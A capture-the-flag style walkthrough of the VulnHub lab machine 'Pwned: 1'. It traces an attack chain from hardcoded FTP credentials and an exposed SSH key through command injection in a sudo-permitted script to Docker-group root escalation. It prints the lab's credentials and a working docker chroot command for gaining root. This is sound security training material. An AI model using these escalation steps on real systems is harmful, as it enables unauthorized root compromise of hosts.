# Pwned: 1 (VulnHub)

## Overview

**Pwned: 1** is an Easy–Medium difficulty VulnHub machine created by **Ajs Walker**. The machine demonstrates how exposed credentials, insecure file sharing, command injection vulnerabilities, and Docker group misconfigurations can be chained together to gain full system compromise.

The challenge highlights the importance of proper credential management, secure coding practices, and privilege separation in Linux environments.

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | Pwned: 1 |
| Platform | VulnHub |
| Author | Ajs Walker |
| Release Date | 10 July 2020 |
| Difficulty | Easy–Medium |
| Attacker OS | Kali Linux |
| Target OS | Debian Linux |
| Objective | Gain Initial Access and Escalate Privileges to Root |

## Skills Demonstrated

- Network Discovery
- Service Enumeration
- Nmap Scanning
- Web Enumeration
- Directory Bruteforcing
- Source Code Analysis
- Credential Discovery
- FTP Enumeration
- SSH Key Authentication
- Linux Enumeration
- Sudo Enumeration
- Command Injection Exploitation
- Docker Privilege Escalation
- Post Exploitation
- Root Compromise

## Tools Used

- Netdiscover
- Nmap
- Gobuster
- FTP
- SSH
- Docker
- GTFOBins
- Kali Linux

## Attack Methodology

1. Discover target host using Netdiscover.
2. Enumerate services with Nmap.
3. Analyze website content and source code.
4. Perform directory bruteforcing with Gobuster.
5. Discover hidden administration panel.
6. Extract hardcoded credentials.
7. Access FTP service.
8. Retrieve SSH private key.
9. Authenticate as Ariana using SSH key.
10. Enumerate sudo permissions.
11. Identify command injection vulnerability.
12. Escalate privileges to Selena.
13. Abuse Docker group membership.
14. Obtain root shell.
15. Capture root flag.

## Vulnerabilities Identified

- Information Disclosure
- Hidden Resource Exposure
- Hardcoded Credentials
- Insecure FTP Storage
- Exposed SSH Private Key
- Sudo Misconfiguration
- Command Injection
- Excessive Docker Privileges

## Initial Access

During enumeration, a hidden administration page exposed hardcoded credentials:

```php
// if ($un=='ftpuser' && $pw=='B0ss_B!TcH') {
```

These credentials allowed access to the FTP service where sensitive files were stored, including an SSH private key. 

## Privilege Escalation

Running:

```bash
sudo -l
```

revealed:

```bash
(selena) NOPASSWD: /home/messenger.sh
```

The script executed user-controlled input directly:

```bash
$msg 2> /dev/null
```

which allowed command injection and privilege escalation to user **selena**. 

## Docker Group Abuse

The Selena account belonged to the Docker group:

```bash
uid=1001(selena)
groups=1001(selena),115(docker)
```

Using a known GTFOBins Docker technique:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

resulted in full root access to the host system.

## Security Lessons Learned

- Never hardcode credentials in source code.
- Protect SSH private keys from unauthorized access.
- Validate and sanitize user input.
- Avoid executing user-supplied data in shell commands.
- Restrict Docker group membership.
- Apply the Principle of Least Privilege.
- Perform regular security assessments.

## Attack Chain Summary

- Netdiscover Host Discovery
- Nmap Enumeration
- Source Code Analysis
- Gobuster Enumeration
- Credential Disclosure
- FTP Access
- SSH Key Discovery
- SSH Login as Ariana
- Command Injection
- Privilege Escalation to Selena
- Docker Abuse
- Root Access

## Disclaimer

This walkthrough was performed in a controlled laboratory environment using an intentionally vulnerable machine from VulnHub. It is intended solely for educational purposes, cybersecurity training, and ethical hacking practice.

---

**Author:** Omkar Babaji Sawant  
**Repository:** VulnHub-Walkthroughs
